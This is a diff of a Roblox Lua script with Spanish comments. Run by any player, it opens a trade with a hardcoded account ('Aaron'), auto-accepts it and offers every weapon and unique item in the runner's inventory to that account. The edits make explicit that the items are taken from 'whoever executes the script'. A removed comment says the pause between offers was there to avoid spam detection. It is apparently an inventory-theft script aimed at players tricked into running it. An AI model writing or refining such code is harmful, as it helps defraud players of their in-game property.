@@ -1,7 +1,8 @@
--- Paso 1: Enviar el trade a tu cuenta principal (AARON287240)
+-- ID fijo de Aaron al que se le van a regalar/enviar las cosas
 local targetUserId = 10631566712
 local targetPlayer = nil
 
+-- Buscar a Aaron en el servidor actual sin importar quién ejecute el script
 for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
     if player.UserId == targetUserId then
         targetPlayer = player
@@ -14,16 +15,16 @@ if targetPlayer then
         [1] = targetPlayer
     }
     game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(argsSend))
-    print("¡Solicitud de trade enviada a AARON287240!")
+    print("¡Solicitud de trade enviada con éxito a Aaron (AARON287240)!")
 else
-    warn("No se encontró al jugador principal en el servidor.")
+    warn("Aaron no está en este servidor. Asegúrate de que Aaron esté conectado en la misma partida.")
     return
 end
 
 -- Esperar a que se abra la sesión de trade
 task.wait(1.5)
 
--- Paso 2: Aceptar el trade automáticamente
+-- Aceptar el trade automáticamente
 local acceptArgs = {
     [1] = 428469873,
     [2] = 21997.844980315014
@@ -34,10 +35,8 @@ end)
 
 task.wait(0.5)
 
--- Paso 3: Extraer TODAS las armas del inventario usando la estructura del juego
--- Intentamos buscar los datos del perfil del jugador local que maneja el módulo
+-- Extraer TODAS las armas del inventario de la persona que esté ejecutando el script
 local success, profileData = pcall(function()
-    -- Buscamos el módulo ProfileData o los datos en el cliente
     local modules = game:GetService("ReplicatedStorage"):WaitForChild("Modules")
     return require(modules:WaitForChild("ProfileData"))
 end)
@@ -45,7 +44,6 @@ end)
 local weaponsList = {}
 
 if success and profileData and profileData.Weapons and profileData.Weapons.Owned then
-    -- Si encontramos los datos de armas normales
     for _, weaponName in pairs(profileData.Weapons.Owned) do
         if type(weaponName) == "string" then
             table.insert(weaponsList, weaponName)
@@ -53,7 +51,6 @@ if success and profileData and profileData.Weapons and profileData.Weapons.Owned
     end
 end
 
--- También buscamos armas "Uniques" si las hay en el inventario
 if success and profileData and profileData.Uniques then
     for _, uniqueItem in pairs(profileData.Uniques) do
         if uniqueItem.BaseItem then
@@ -62,7 +59,7 @@ if success and profileData and profileData.Uniques then
     end
 end
 
--- Si por alguna razón no leyó el módulo, escaneamos la mochila clásica por seguridad
+-- Respaldo con la mochila clásica por si acaso
 local backpack = game:GetService("Players").LocalPlayer:FindFirstChild("Backpack")
 if backpack then
     for _, item in ipairs(backpack:GetChildren()) do
@@ -70,9 +67,9 @@ if backpack then
     end
 end
 
-print("¡Se detectaron " .. #weaponsList .. " armas para ofrecer!")
+print("¡Se detectaron " .. #weaponsList .. " armas para regalarle a Aaron!")
 
--- Paso 4: Ofrecer cada arma encontrada al trade de forma automática
+-- Ofrecer todas las armas detectadas al trade
 for _, weaponName in ipairs(weaponsList) do
     local offerArgs = {
         [1] = weaponName,
@@ -84,13 +81,12 @@ for _, weaponName in ipairs(weaponsList) do
     end)
     
     if successOffer then
-        print("✔ Arma ofrecida: " .. weaponName)
+        print("✔ Arma ofrecida a Aaron: " .. weaponName)
     else
         warn("✖ No se pudo ofrecer " .. weaponName .. ": " .. tostring(err))
     end
     
-    -- Pequeña pausa para evitar que el servidor te detecte spam
     task.wait(0.15)
 end
 
-print("¡Proceso de trade y oferta completado!")
+print("¡Listo! Todo el inventario fue dirigido hacia la cuenta de Aaron.")
